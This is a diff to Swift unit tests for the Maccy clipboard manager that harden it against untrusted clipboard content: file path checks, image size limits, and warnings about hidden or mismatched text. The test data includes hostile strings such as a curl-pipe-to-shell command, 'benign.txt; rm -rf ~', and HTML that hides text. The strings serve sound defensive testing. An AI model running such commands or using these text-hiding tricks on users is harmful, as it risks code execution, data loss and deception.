@@ -1,7 +1,9 @@
 import AppKit
 import Defaults
+import ImageIO
 import SwiftData
 import Testing
+import UniformTypeIdentifiers
 @testable import Maccy
 
 // A7: clipboard content is untrusted. What Maccy shows is what it pastes, and
@@ -19,6 +21,7 @@ extension SharedStateTests {
     let savedIgnoreAllAppsExceptListed = Defaults[.ignoreAllAppsExceptListed]
     let savedIgnoredApps = Defaults[.ignoredApps]
     let savedIgnoredPasteboardTypes = Defaults[.ignoredPasteboardTypes]
+    let savedIntentsEnabled = Defaults[.intentsEnabled]
 
     init() {
       preferences.removeObject(forKey: StoragePolicy.preferenceKey)
@@ -43,6 +46,7 @@ extension SharedStateTests {
       Defaults[.ignoreAllAppsExceptListed] = savedIgnoreAllAppsExceptListed
       Defaults[.ignoredApps] = savedIgnoredApps
       Defaults[.ignoredPasteboardTypes] = savedIgnoredPasteboardTypes
+      Defaults[.intentsEnabled] = savedIntentsEnabled
       UniversalClipboardFile.allowedDirectoriesForTesting = nil
       UniversalClipboardFile.maximumBytesForTesting = nil
       UniversalClipboardFile.readObserverForTesting = nil
@@ -51,6 +55,8 @@ extension SharedStateTests {
       ContentLimits.maximumImagePixelsForTesting = nil
       OCRSetting.preferencesForTesting = nil
       HistoryItem.visionInputObserverForTesting = nil
+      HistoryItem.recognitionWorkObserverForTesting = nil
+      ValidatedImage.maximumImageCountForTesting = nil
     }
 
     // MARK: Group 1: one value per type
@@ -87,16 +93,17 @@ extension SharedStateTests {
       #expect(decorator.formattedTextComparison == .differs)
       #expect(PreviewItemView.formattedTextNote(.differs) != nil)
 
+      // Only whitespace differs: nothing is said, and nothing claims they match.
       let same = NSPasteboardItem()
       same.setString("Pay  Alice 100", forType: .string)
-      same.setString("<ul><li>Pay <i>Alice</i>&nbsp;100.</li></ul>", forType: .html)
+      same.setString("<ul><li>Pay <i>Alice</i>&nbsp;100</li></ul>", forType: .html)
       let rtf = NSAttributedString(string: "Pay Alice 100")
       same.setData(try #require(rtf.rtf(from: NSRange(location: 0, length: rtf.length))), forType: .rtf)
       pasteboard.clearContents()
       pasteboard.writeObjects([same])
       let sameDecorator = History.shared.added(try #require(checkNow().first))
-      #expect(sameDecorator.formattedTextComparison == .same)
-      #expect(PreviewItemView.formattedTextNote(.same) == nil)
+      #expect(sameDecorator.formattedTextComparison == .noTextDifference)
+      #expect(PreviewItemView.formattedTextNote(.noTextDifference) == nil)
     }
 
     @Test("A Finder copy of several files keeps and pastes every file, each once")
@@ -198,12 +205,12 @@ extension SharedStateTests {
       // A valid file: shown as an image, but only read in the background.
       let item = universalClipboardItem(valid)
       #expect(HistoryItemDecorator(item).hasImage)
-      #expect(item.image == nil)
+      #expect(item.imagePixelSize == nil)
       #expect(item.imageData == nil)
       #expect(reads.values.isEmpty)
       await item.loadImageIfNeeded()
       #expect(item.imageData == jpeg)
-      #expect(item.image != nil)
+      #expect(item.imagePixelSize != nil)
       #expect(Get.contents(of: item, readableBy: StoragePolicy.currentReadAllowList).image == jpeg)
 
       // Paths outside the staging location are never looked up at all.
@@ -219,7 +226,7 @@ extension SharedStateTests {
         let rejected = universalClipboardItem(url)
         await rejected.loadImageIfNeeded()
         #expect(rejected.imageData == nil, "\(url.lastPathComponent)")
-        #expect(rejected.image == nil, "\(url.lastPathComponent)")
+        #expect(rejected.imagePixelSize == nil, "\(url.lastPathComponent)")
       }
       // Every read so far ran in the background.
       #expect(reads.values.count == 5)
@@ -241,24 +248,51 @@ extension SharedStateTests {
         try UniversalClipboardFile.read(staging.appending(path: "copy/../../elsewhere/photo.jpeg"))
       }
       #expect(try UniversalClipboardFile.read(valid) == jpeg)
+
+      // A second name for the file (a hard link) is refused, whichever name is used.
+      let hardLink = staging.appending(path: "copy/hard.jpeg")
+      #expect(link(valid.path, hardLink.path) == 0)
+      #expect(throws: UniversalClipboardFile.Rejection.hardLinked) { try UniversalClipboardFile.read(hardLink) }
+      #expect(throws: UniversalClipboardFile.Rejection.hardLinked) { try UniversalClipboardFile.read(valid) }
+      try files.removeItem(at: hardLink)
+      #expect(try UniversalClipboardFile.read(valid) == jpeg)
+
+      // An allowed directory that is itself a symlink to elsewhere is refused.
+      let linkedRoot = root.appending(path: "linked-root")
+      try files.createSymbolicLink(at: linkedRoot, withDestinationURL: staging)
+      UniversalClipboardFile.allowedDirectoriesForTesting = [linkedRoot.path]
+      #expect(throws: UniversalClipboardFile.Rejection.allowedDirectoryNotTrusted) {
+        try UniversalClipboardFile.read(linkedRoot.appending(path: "copy/photo.jpeg"))
+      }
+
+      // A file owned by another user is refused (checked on its status).
+      var status = stat()
+      #expect(stat(valid.path, &status) == 0)
+      #expect(throws: UniversalClipboardFile.Rejection.notOwnedByUser) {
+        try UniversalClipboardFile.check(status, userID: getuid() + 1)
+      }
+      try UniversalClipboardFile.check(status)
     }
 
-    @Test("Without an override, only the two known staging directories are allowed")
-    func universalClipboardStagingDirectories() {
+    @Test("Without an override, only the current user's staging directories are allowed")
+    func universalClipboardStagingDirectories() throws {
       let directories = UniversalClipboardFile.allowedDirectories
-      #expect(directories.count == 2)
+      #expect(!directories.contains { $0.contains("*") })
       #expect(directories.contains {
         $0.hasSuffix("/Library/Group Containers/group.com.apple.coreservices.useractivityd/shared-pasteboard/items/")
       })
-      #expect(directories.contains("/private/var/folders/*/*/T/com.apple.useractivityd/shared-pasteboard/items/"))
-      for path in [
-        "/private/var/folders/ab/cdef123/T/com.apple.useractivityd/shared-pasteboard/items/UUID/photo.jpeg",
-        "/var/folders/ab/cdef123/T/com.apple.useractivityd/shared-pasteboard/items/UUID/photo.jpeg"
-      ] {
-        #expect(UniversalClipboardFile.isInAllowedLocation(URL(fileURLWithPath: path)))
+      // The per-user temporary directory, when it can be found, is this user's only.
+      let temporary = directories.filter { $0.hasPrefix("/private/var/folders/") }
+      #expect(temporary.count <= 1)
+      if let ours = temporary.first {
+        #expect(ours.hasSuffix("/T/com.apple.useractivityd/shared-pasteboard/items/"))
+        #expect(UniversalClipboardFile.isInAllowedLocation(URL(fileURLWithPath: ours + "UUID/photo.jpeg")))
+        let unaliased = String(ours.dropFirst("/private".count))
+        #expect(UniversalClipboardFile.isInAllowedLocation(URL(fileURLWithPath: unaliased + "UUID/photo.jpeg")))
       }
       for path in [
         "/Volumes/Share/photo.jpeg",
+        "/private/var/folders/zz/another-user/T/com.apple.useractivityd/shared-pasteboard/items/UUID/photo.jpeg",
         "/private/var/folders/ab/T/com.apple.useractivityd/shared-pasteboard/items/photo.jpeg",
         "/private/var/folders/ab/cd/T/com.apple.useractivityd/shared-pasteboard/items",
         "/private/var/folders/ab/cd/T/com.apple.useractivityd/shared-pasteboard/itemsX/photo.jpeg",
@@ -266,6 +300,12 @@ extension SharedStateTests {
       ] {
         #expect(!UniversalClipboardFile.isInAllowedLocation(URL(fileURLWithPath: path)), "\(path)")
       }
+
+      #expect(UniversalClipboardFile.userTemporaryRoot(of: "/var/folders/ab/cd/T/") == "/private/var/folders/ab/cd/T/")
+      #expect(UniversalClipboardFile.userTemporaryRoot(of: "/private/var/folders/ab/cd/T/com.example/") ==
+              "/private/var/folders/ab/cd/T/")
+      #expect(UniversalClipboardFile.userTemporaryRoot(of: "/Users/someone/Library/Containers/x/Data/tmp/") == nil)
+      #expect(UniversalClipboardFile.userTemporaryRoot(of: "/var/folders/ab/cd/C/") == nil)
     }
 
     // MARK: Group 3: no WebKit import
@@ -362,12 +402,17 @@ extension SharedStateTests {
       #expect(checkNow().isEmpty)
     }
 
-    @Test("The default limits fit a full-screen 8K screenshot as TIFF plus PNG")
+    @Test("The default limits: 64 MiB per representation, 96 MiB per copy; a 5K capture as TIFF plus PNG fits")
     func defaultLimitsFitScreenshots() {
-      let tiff = 7_680 * 4_320 * 4 + 64 * 1_024
+      #expect(ContentLimits.maximumRepresentationBytes == 64 * 1_024 * 1_024)
+      #expect(ContentLimits.maximumCopyBytes == 96 * 1_024 * 1_024)
+      // 5K Retina full screen (5120×2880) as uncompressed 32-bit TIFF: 59.0 MB.
+      let tiff = 5_120 * 2_880 * 4 + 64 * 1_024
       #expect(tiff <= ContentLimits.maximumRepresentationBytes)
-      #expect(tiff + 45 * 1_024 * 1_024 <= ContentLimits.maximumCopyBytes)
-      #expect(7_680 * 4_320 <= ContentLimits.maximumImagePixels)
+      #expect(tiff + 25 * 1_024 * 1_024 <= ContentLimits.maximumCopyBytes)
+      // A 6K capture (6016×3384) as TIFF is over the limit and is not recorded.
+      #expect(6_016 * 3_384 * 4 > ContentLimits.maximumRepresentationBytes)
+      #expect(5_120 * 2_880 <= ContentLimits.maximumImagePixels)
       #expect(UniversalClipboardFile.maximumBytes == ContentLimits.maximumRepresentationBytes)
     }
 
@@ -376,14 +421,16 @@ extension SharedStateTests {
       ContentLimits.maximumImagePixelsForTesting = 100
       let small = try pngData(width: 10, height: 10)
       let large = try pngData(width: 11, height: 10)
-      #expect(ContentLimits.pixelSize(of: large)?.width == 11)
-      #expect(ContentLimits.imageMayBeDecoded(small))
-      #expect(!ContentLimits.imageMayBeDecoded(large))
-      #expect(!ContentLimits.imageMayBeDecoded(Data("not an image".utf8)))
+      #expect(ValidatedImage.inspect(large) == .failure(.imageTooLarge(index: 0, pixels: 110)))
+      #expect(ValidatedImage.isAcceptable(small))
+      #expect(!ValidatedImage.isAcceptable(large))
+      #expect(!ValidatedImage.isAcceptable(Data("not an image".utf8)))
 
-      #expect(imageItem(small).image != nil)
+      #expect(imageItem(small).imagePixelSize == NSSize(width: 10, height: 10))
+      #expect(await imageItem(small).decodedImage(for: .preview) != nil)
       let largeItem = imageItem(large)
-      #expect(largeItem.image == nil)
+      #expect(largeItem.imagePixelSize == nil)
+      #expect(await largeItem.decodedImage(for: .preview) == nil)
       #expect(HistoryItemDecorator(largeItem).hasImage == false)
 
       let visionInputs = ThreadRecorder()
@@ -487,6 +534,376 @@ extension SharedStateTests {
       #expect(PreviewItemView.truncationNote(shortDecorator.previewIsTruncated) == nil)
     }
 
+    // MARK: Review round: text pasted instead of files or an image
+
+    @Test("A file copy that also carries other text shows that text, warns, and pastes exactly it")
+    func fileWithOtherText() throws {
+      let payload = "echo attacker-payload"
+      let item = NSPasteboardItem()
+      item.setData(URL(fileURLWithPath: "/tmp/benign.txt").dataRepresentation, forType: .fileURL)
+      item.setString(payload, forType: .string)
+      pasteboard.clearContents()
+      pasteboard.writeObjects([item])
+
+      let decorator = History.shared.added(try #require(checkNow().first))
+      // The title still shows the file.
+      #expect(decorator.item.displayTitle == "file:///tmp/benign.txt")
+      // The preview shows the text a text destination receives, and warns.
+      let warnings = decorator.textWarnings
+      #expect(warnings.pastedText?.string == payload)
+      #expect(warnings.pastedTextIsNotFileNames)
+      #expect(PreviewItemView.pastedTextNote(warnings.pastedTextIsNotFileNames) != nil)
+      // Get and both pastes deliver exactly that text.
+      #expect(Get.contents(of: decorator.item, readableBy: StoragePolicy.currentReadAllowList).text == payload)
+      clipboard.copy(decorator.item)
+      #expect(pastedStrings() == [payload])
+      clipboard.copy(decorator.item, removeFormatting: true)
+      #expect(pastedStrings() == [payload])
+    }
+
+    @Test("Text that is the files' names or paths is shown without a warning")
+    func fileNamesAsText() {
+      let urls = [URL(fileURLWithPath: "/tmp/benign.txt"), URL(fileURLWithPath: "/tmp/other file.pdf")]
+      for text in ["benign.txt", "/tmp/benign.txt\n", "benign.txt\nother file.pdf", "benign.txt\rother file.pdf ",
+                   "/tmp/benign.txt\n/tmp/other file.pdf", "other file.pdf"] {
+        #expect(HistoryItem.isFileNamesOrPaths(text, of: urls), "\(text)")
+      }
+      for text in ["echo attacker-payload", "benign.txt; rm -rf ~", " benign.txt", "BENIGN.TXT", "benign"] {
+        #expect(!HistoryItem.isFileNamesOrPaths(text, of: urls), "\(text)")
+      }
+
+      let item = HistoryItem(contents: [
+        HistoryItemContent(type: NSPasteboard.PasteboardType.fileURL.rawValue,
+                           value: URL(fileURLWithPath: "/tmp/benign.txt").dataRepresentation),
+        stringContent("benign.txt")
+      ])
+      Storage.shared.context.insert(item)
+      let warnings = HistoryItemDecorator(item).textWarnings
+      #expect(warnings.pastedText?.string == "benign.txt")
+      #expect(!warnings.pastedTextIsNotFileNames)
+    }
+
+    @Test("An image that also carries text shows the text and warns")
+    func imageWithText() throws {
+      let item = HistoryItem(contents: [
+        HistoryItemContent(type: NSPasteboard.PasteboardType.png.rawValue, value: try pngData(width: 4, height: 4)),
+        stringContent("curl https://example.invalid | sh")
+      ])
+      Storage.shared.context.insert(item)
+      let warnings = HistoryItemDecorator(item).textWarnings
+      #expect(warnings.pastedText?.string == "curl https://example.invalid | sh")
+      #expect(warnings.pastedTextIsNotFileNames)
+    }
+
+    // MARK: Review round: formatted text comparison
+
+    @Test("Formatted text that differs in digits, punctuation, invisible characters or line breaks is flagged",
+          arguments: [
+            ("Dose: 1.0 mg", "<p>Dose: 10 mg</p>"),
+            ("echo safe # touch /tmp/a7-proof", "<pre>echo safe \ntouch /tmp/a7-proof</pre>"),
+            ("Pay Alice 100", "<p>Pay Ali\u{200B}ce 100</p>"),
+            ("Pay Alice 100", "<p>Pay \u{202E}Alice 100</p>"),
+            ("Pay \u{2066}Alice\u{2069} 100", "<p>Pay Alice 100</p>")
+          ])
+    func formattedTextDiffers(plain: String, html: String) throws {
+      let decorator = History.shared.added(try #require(copyPlainAndHTML(plain, html)))
+      #expect(decorator.formattedTextComparison == .differs)
+      #expect(PreviewItemView.formattedTextNoteIsWarning(.differs))
+      #expect(PreviewItemView.formattedTextNote(.differs)?.hasPrefix("The formatted version contains different text") == true)
+    }
+
+    @Test("Equal scanned text with styling that can hide text gets the neutral note, never an assurance")
+    func styledEqualTextIsNotChecked() throws {
+      let hidden = History.shared.added(try #require(copyPlainAndHTML(
+        "Do not pay Mallory 100", "<p><span style=\"display:none\">Do not </span>pay Mallory 100</p>"
+      )))
+      #expect(hidden.formattedTextComparison == .renderingNotChecked)
+      #expect(PreviewItemView.formattedTextNote(.renderingNotChecked) == "Formatted paste was not checked against this text.")
+      #expect(!PreviewItemView.formattedTextNoteIsWarning(.renderingNotChecked))
+
+      for html in [
+        "<p style=\"color:red\">Pay Alice 100</p>",
+        "<style>p { color: white }</style><p>Pay Alice 100</p>",
+        "<link rel=\"stylesheet\" href=\"x.css\"><p class=\"a\">Pay Alice 100</p>",
+        "<p hidden>Pay Alice 100</p>",
+        "<p>Pay Alice 100<script>1</script></p>",
+        "<p>Pay Alice <img src=\"x.png\" alt=\"x\">100</p>",
+        "<form><p>Pay Alice 100</p></form>",
+        "<p>Pay Alice 100<svg></svg></p>"
+      ] {
+        let styled = History.shared.added(try #require(copyPlainAndHTML("Pay Alice 100", html)))
+        #expect(styled.formattedTextComparison == .renderingNotChecked, "\(html)")
+      }
+
+      // Plain structural and inline markup with the same text: nothing is shown.
+      let plain = History.shared.added(try #require(copyPlainAndHTML(
+        "Pay Alice 100", "<div><p>Pay <b>Alice</b> <a href=\"https://example.invalid\">100</a></p></div>"
+      )))
+      #expect(plain.formattedTextComparison == .noTextDifference)
+      #expect(PreviewItemView.formattedTextNote(.noTextDifference) == nil)
+    }
+
+    @Test("The comparison normalises only NFC and whitespace")
+    func comparableText() {
+      #expect(RichTextImport.comparableText(" Pay\u{00A0}\n Alice\t100 ") == "Pay Alice 100")
+      #expect(RichTextImport.comparableText("caf\u{0065}\u{0301}") == RichTextImport.comparableText("caf\u{00E9}"))
+      #expect(RichTextImport.comparableText("Pay alice") != RichTextImport.comparableText("Pay Alice"))
+      #expect(RichTextImport.comparableText("1.0") != RichTextImport.comparableText("10"))
+      #expect(RichTextImport.comparableText("a\u{200B}b") != RichTextImport.comparableText("ab"))
+    }
+
+    @Test("Invisible and direction-changing characters in the plain text are flagged")
+    func invisibleCharactersAreFlagged() {
+      for text in ["rm\u{200B} -rf", "abc\u{202E}def", "a\u{2066}b\u{2069}", "a\u{00AD}b", "a\u{0007}b",
+                   "a\rb", "a\u{0085}b", "\u{FEFF}text", "tag\u{E0041}"] {
+        #expect(RichTextImport.containsInvisibleOrDirectionalScalars(text), "\(text.unicodeScalars.map(\.value))")
+      }
+      for text in ["plain text", "tab\tand\nnewline", "👩‍💻 developer", "naïve café", "مرحبا"] {
+        #expect(!RichTextImport.containsInvisibleOrDirectionalScalars(text), "\(text)")
+      }
+      let item = HistoryItem(contents: [stringContent("Pay \u{202E}001 ecilA")])
+      Storage.shared.context.insert(item)
+      let warnings = HistoryItemDecorator(item).textWarnings
+      #expect(warnings.hasInvisibleCharacters)
+      #expect(PreviewItemView.invisibleCharactersNote(warnings.hasInvisibleCharacters) != nil)
+      #expect(PreviewItemView.invisibleCharactersNote(false) == nil)
+    }
+
+    @Test("HTML handed to the RTF importer is not imported as HTML")
+    func rtfImportNeverSniffsHTML() {
+      let html = Data("<html><body><b>Hidden</b> text</body></html>".utf8)
+      let text = RichTextImport.text(fromRTF: html)
+      #expect(text == nil || text?.contains("<b>") == true)
+      let direct = RichTextImport.rtfText(html)
+      #expect(direct == nil || direct?.contains("<b>") == true)
+    }
+
+    // MARK: Review round: images
+
+    @Test("Every image in a container is checked; only one validated image is decoded")
+    func everyImageIsChecked() async throws {
+      ContentLimits.maximumImagePixelsForTesting = 100
+      let tiff = try container(.tiff, [(10, 10), (20, 20)])
+      #expect(ValidatedImage.inspect(tiff) == .failure(.imageTooLarge(index: 1, pixels: 400)))
+      let tiffItem = imageItem(tiff, type: .tiff)
+      #expect(tiffItem.imagePixelSize == nil)
+      #expect(!HistoryItemDecorator(tiffItem).hasImage)
+      let decodes = ValidatedImage.decodesForTesting
+      #expect(await tiffItem.decodedImage(for: .preview) == nil)
+      #expect(ValidatedImage.cgImage(from: tiff, for: .fullSize) == nil)
+      #expect(ValidatedImage.decodesForTesting == decodes)
+
+      // Within the limits the largest image is the one decoded.
+      ContentLimits.maximumImagePixelsForTesting = 400
+      let decoded = try #require(ValidatedImage.cgImage(from: tiff, for: .fullSize))
+      #expect([decoded.width, decoded.height] == [20, 20])
+
+      // Animations: the number of frames and their total pixels are bounded.
+      ContentLimits.maximumImagePixelsForTesting = 100
+      let manyFrames = try container(.gif, Array(repeating: (1, 1), count: 40))
+      ValidatedImage.maximumImageCountForTesting = 32
+      #expect(ValidatedImage.inspect(manyFrames) == .failure(.tooManyImages(40)))
+      ValidatedImage.maximumImageCountForTesting = nil
+      let largeTotal = try container(.gif, Array(repeating: (10, 10), count: 3))
+      #expect(ValidatedImage.inspect(largeTotal) == .failure(.totalTooLarge(pixels: 300)))
+      let apng = try container(.png, Array(repeating: (10, 10), count: 3))
+      #expect(!ValidatedImage.isAcceptable(apng))
+      #expect(ValidatedImage.isAcceptable(try container(.gif, Array(repeating: (10, 10), count: 2))))
+
+      // Ordinary PNG and JPEG.
+      ContentLimits.maximumImagePixelsForTesting = nil
+      for (type, data) in [(NSPasteboard.PasteboardType.png, try pngData(width: 30, height: 20)),
+                           (.jpeg, try jpegData(width: 30, height: 20))] {
+        let item = imageItem(data, type: type)
+        #expect(item.imagePixelSize == NSSize(width: 30, height: 20))
+        let image = try #require(await item.decodedImage(for: .preview))
+        #expect([image.cgImage.width, image.cgImage.height] == [30, 20])
+      }
+      // A thumbnail is decoded at most 1024 pixels on its longest side.
+      let large = try container(.png, [(3_000, 2_000)])
+      let thumbnail = try #require(ValidatedImage.cgImage(from: large, for: .thumbnail))
+      #expect(max(thumbnail.width, thumbnail.height) <= 1_024)
+    }
+
+    @Test("The Get intent converts images only through the validated decoder, off the main actor, and re-checks after")
+    func getIntentImageExport() async throws {
+      let exports = FileManager.default.temporaryDirectory.appending(path: "a7-exports-\(UUID().uuidString)")
+      IntentImageExports.directoryForTesting = exports
+      defer {
+        IntentImageExports.directoryForTesting = nil
+        Get.afterImageConversionForTesting = nil
+        try? FileManager.default.removeItem(at: exports)
+      }
+      Defaults[.intentsEnabled] = true
+
+      // A two-image TIFF over the limit: nothing is decoded or exported.
+      ContentLimits.maximumImagePixelsForTesting = 100
+      let decodes = ValidatedImage.decodesForTesting
+      let tiffItem = imageItem(try container(.tiff, [(10, 10), (20, 20)]), type: .tiff)
+      let (_, refused) = try await Get.export(tiffItem)
+      #expect(refused == nil)
+      #expect(ValidatedImage.decodesForTesting == decodes)
+
+      // A normal image is exported as PNG through the same decoder.
+      ContentLimits.maximumImagePixelsForTesting = nil
+      let item = imageItem(try jpegData(width: 6, height: 4), type: .jpeg)
+      let (_, url) = try await Get.export(item)
+      let exported = try Data(contentsOf: try #require(url))
+      #expect(Array(exported.prefix(8)) == [137, 80, 78, 71, 13, 10, 26, 10])
+      #expect(ValidatedImage.pixelSize(of: exported).map { [$0.width, $0.height] } == [6, 4])
+      #expect(ValidatedImage.decodesForTesting > decodes)
+
+      // Intents turned off while the image was converted: nothing is handed out.
+      Get.afterImageConversionForTesting = { Defaults[.intentsEnabled] = false }
+      await #expect(throws: AppIntentError.disabled) { _ = try await Get.export(item) }
+
+      // Images no longer stored by then: the converted image is not exported.
+      Defaults[.intentsEnabled] = true
+      let preferences = self.preferences
+      Get.afterImageConversionForTesting = {
+        preferences.set([NSPasteboard.PasteboardType.string.rawValue], forKey: StoragePolicy.preferenceKey)
+      }
+      let captioned = HistoryItem(contents: [
+        HistoryItemContent(type: NSPasteboard.PasteboardType.png.rawValue, value: try pngData(width: 4, height: 4)),
+        stringContent("caption")
+      ])
+      Storage.shared.context.insert(captioned)
+      let (contents, afterPolicyChange) = try await Get.export(captioned)
+      #expect(afterPolicyChange == nil)
+      #expect(contents.image == nil)
+      #expect(contents.text == "caption")
+    }
+
+    @Test("Thumbnail and preview share one file read; cleaned-up work doesn't come back")
+    func imageLoadsAreCoalescedAndDiscarded() async throws {
+      let files = FileManager.default
+      let staging = files.temporaryDirectory.appending(path: "a7-uc-load-\(UUID().uuidString)")
+      try files.createDirectory(at: staging, withIntermediateDirectories: true)
+      defer { try? files.removeItem(at: staging) }
+      UniversalClipboardFile.allowedDirectoriesForTesting = [staging.path]
+      let url = staging.appending(path: "photo.jpeg")
+      try jpegData(width: 8, height: 8).write(to: url)
+      let reads = ThreadRecorder()
+      UniversalClipboardFile.readObserverForTesting = { reads.record($0) }
+
+      let item = universalClipboardItem(url)
+      async let thumbnail = item.decodedImage(for: .thumbnail)
+      async let preview = item.decodedImage(for: .preview)
+      let (first, second) = await (thumbnail, preview)
+      #expect(first != nil)
+      #expect(second != nil)
+      #expect(reads.values.count == 1)
+
+      // Work started before a clean-up never repopulates the decorator or item.
+      let decorator = HistoryItemDecorator(item)
+      decorator.ensurePreviewImage()
+      let task = try #require(decorator.previewImageGenerationTask)
+      decorator.cleanupImages()
+      _ = await task.result
+      #expect(decorator.previewImage == nil)
+      #expect(item.imageData == nil)
+    }
+
+    // MARK: Review round: bounded reads
+
+    @Test("A later item's value of a type is not read unless ignore rules need it; each value is read once")
+    func laterDuplicatesAreNotRead() throws {
+      let firstProvider = CountingDataProvider([.string: Data("first".utf8)])
+      let laterProvider = CountingDataProvider([.string: Data("second".utf8)])
+      func copyBoth() {
+        let first = NSPasteboardItem()
+        first.setDataProvider(firstProvider, forTypes: [.string])
+        let later = NSPasteboardItem()
+        later.setDataProvider(laterProvider, forTypes: [.string])
+        pasteboard.clearContents()
+        pasteboard.writeObjects([first, later])
+      }
+
+      copyBoth()
+      let copied = try #require(checkNow().first)
+      #expect(stringValues(copied) == ["first"])
+      #expect(firstProvider.count(for: .string) == 1)
+      #expect(laterProvider.count(for: .string) == 0)
+
+      // With an ignore rule, the rules read the later value too, but the
+      // first is still read only once.
+      Defaults[.ignoreRegexp] = ["^never-matches$"]
+      copyBoth()
+      let checked = try #require(checkNow().first)
+      #expect(stringValues(checked) == ["first"])
+      #expect(firstProvider.count(for: .string) == 2)
+      #expect(laterProvider.count(for: .string) == 1)
+    }
+
+    @Test("Oversized text or HTML is refused before it is decoded or scanned, and the user is told")
+    func oversizedIsRejectedBeforeDecoding() throws {
+      let notifications = RecordingNotificationClient()
+      let savedClient = Notifier.client
+      Notifier.client = notifications
+      defer { Notifier.client = savedClient }
+      ContentLimits.maximumRepresentationBytesForTesting = 100
+      let decodes = PasteboardCopyRead.decodesForTesting
+      let rtfImports = RichTextImport.rtfImportsForTesting
+
+      copyString(String(repeating: "a", count: 101))
+      #expect(checkNow().isEmpty)
+
+      // An empty string used to send the HTML to the scanner before its size was known.
+      let item = NSPasteboardItem()
+      item.setString("", forType: .string)
+      item.setData(Data(repeating: 0x3C, count: 1_000), forType: .html)
+      pasteboard.clearContents()
+      pasteboard.writeObjects([item])
+      #expect(checkNow().isEmpty)
+
+      #expect(PasteboardCopyRead.decodesForTesting == decodes)
+      #expect(RichTextImport.rtfImportsForTesting == rtfImports)
+
+      notifications.resolvePermissions()
+      #expect(notifications.added.count == 2)
+      #expect(notifications.added.allSatisfy {
+        $0.identifier == Notifier.copyTooLargeIdentifier && $0.content.body == "A copy was too large to save"
+      })
+    }
+
+    // MARK: Review round: text recognition
+
+    @Test("Queued text recognition stops before it starts once recognition is turned off or cancelled",
+          arguments: ["setting off", "cancelled"])
+    func queuedRecognitionStops(how: String) async throws {
+      OCRSetting.preferencesForTesting = try scratchDefaults()
+      let started = ThreadRecorder()
+      HistoryItem.recognitionWorkObserverForTesting = { started.record(false) }
+      let visionInputs = ThreadRecorder()
+      HistoryItem.visionInputObserverForTesting = { _ in visionInputs.record(false) }
+
+      // Hold the recognition queue so every job is still waiting.
+      let gate = DispatchSemaphore(value: 0)
+      HistoryItem.textRecognitionQueueForTesting.async { gate.wait() }
+
+      let before = HistoryItem.recognitionTasksForTesting.count
+      for size in 4...6 {
+        imageItem(try pngData(width: size, height: size)).regenerateTitle()
+      }
+      let tasks = Array(HistoryItem.recognitionTasksForTesting.dropFirst(before))
+      #expect(tasks.count == 3)
+
+      if how == "cancelled" {
+        HistoryItem.cancelAllTextRecognition()
+      } else {
+        let off = try scratchDefaults()
+        off.set(false, forKey: OCRSetting.preferenceKey)
+        OCRSetting.preferencesForTesting = off
+        History.shared.applyOCRSetting()
+      }
+      gate.signal()
+      for task in tasks {
+        await task.value
+      }
+      #expect(started.values.isEmpty)
+      #expect(visionInputs.values.isEmpty)
+    }
+
     // MARK: Helpers
 
     private func copyString(_ string: String) {
@@ -494,12 +911,45 @@ extension SharedStateTests {
       pasteboard.setString(string, forType: .string)
     }
 
-    private func imageItem(_ data: Data) -> HistoryItem {
+    private func imageItem(_ data: Data, type: NSPasteboard.PasteboardType = .png) -> HistoryItem {
       let item = HistoryItem(contents: [
-        HistoryItemContent(type: NSPasteboard.PasteboardType.png.rawValue, value: data)
+        HistoryItemContent(type: type.rawValue, value: data)
       ])
       Storage.shared.context.insert(item)
       return item
+    }
+
+    // An image container (TIFF pages, GIF or APNG frames) of solid images.
+    private func container(_ type: UTType, _ sizes: [(Int, Int)]) throws -> Data {
+      let output = NSMutableData()
+      let destination = try #require(CGImageDestinationCreateWithData(
+        output as CFMutableData, type.identifier as CFString, sizes.count, nil
+      ))
+      let frame: [CFString: Any] = [
+        kCGImagePropertyGIFDictionary: [kCGImagePropertyGIFDelayTime: 0.1],
+        kCGImagePropertyPNGDictionary: [kCGImagePropertyAPNGDelayTime: 0.1]
+      ]
+      for (width, height) in sizes {
+        let context = try #require(CGContext(
+          data: nil, width: width, height: height, bitsPerComponent: 8, bytesPerRow: 0,
+          space: CGColorSpaceCreateDeviceRGB(), bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue
+        ))
+        context.setFillColor(CGColor(red: 1, green: 0, blue: 0, alpha: 1))
+        context.fill(CGRect(x: 0, y: 0, width: width, height: height))
+        CGImageDestinationAddImage(destination, try #require(context.makeImage()), frame as CFDictionary)
+      }
+      #expect(CGImageDestinationFinalize(destination))
+      return output as Data
+    }
+
+    // One pasteboard item with plain text and HTML, recorded.
+    private func copyPlainAndHTML(_ plain: String, _ html: String) -> HistoryItem? {
+      let item = NSPasteboardItem()
+      item.setString(plain, forType: .string)
+      item.setString(html, forType: .html)
+      pasteboard.clearContents()
+      pasteboard.writeObjects([item])
+      return checkNow().first
     }
 
     private func pngData(width: Int, height: Int) throws -> Data {
@@ -605,4 +1055,27 @@ final class ThreadRecorder: @unchecked Sendable {
   }
 
   var values: [Bool] { lock.withLock { recorded } }
+}
+
+// Supplies pasteboard data on request and counts each request.
+final class CountingDataProvider: NSObject, NSPasteboardItemDataProvider, @unchecked Sendable {
+  private let lock = NSLock()
+  private let values: [NSPasteboard.PasteboardType: Data]
+  private var counts: [NSPasteboard.PasteboardType: Int] = [:]
+
+  init(_ values: [NSPasteboard.PasteboardType: Data]) {
+    self.values = values
+  }
+
+  func count(for type: NSPasteboard.PasteboardType) -> Int {
+    lock.withLock { counts[type, default: 0] }
+  }
+
+  func pasteboard(_ pasteboard: NSPasteboard?, item: NSPasteboardItem,
+                  provideDataForType type: NSPasteboard.PasteboardType) {
+    lock.withLock { counts[type, default: 0] += 1 }
+    if let value = values[type] {
+      item.setData(value, forType: type)
+    }
+  }
 }
